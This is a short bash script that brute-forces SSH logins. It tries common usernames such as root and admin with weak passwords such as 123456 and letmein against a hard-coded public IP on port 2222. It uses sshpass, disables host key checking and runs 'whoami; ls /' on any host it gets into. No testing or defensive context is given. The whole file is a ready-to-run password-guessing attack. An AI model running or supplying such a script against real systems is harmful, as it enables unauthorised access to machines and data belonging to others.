#!/bin/bash
# Run from your local Linux/Mac or WSL on Windows
TARGET_IP="34.239.112.221"
PORT=2222

USERS=("root" "admin" "ubuntu" "test" "oracle")
PASSWORDS=("123456" "password" "admin" "letmein" "qwerty")

for user in "${USERS[@]}"; do
  for pass in "${PASSWORDS[@]}"; do
    echo "[*] Trying $user:$pass"
    sshpass -p "$pass" ssh -p $PORT \
      -o StrictHostKeyChecking=no \
      -o ConnectTimeout=5 \
      "$user@$TARGET_IP" "whoami; ls /; exit" 2>/dev/null || true
    sleep 1
  done
done
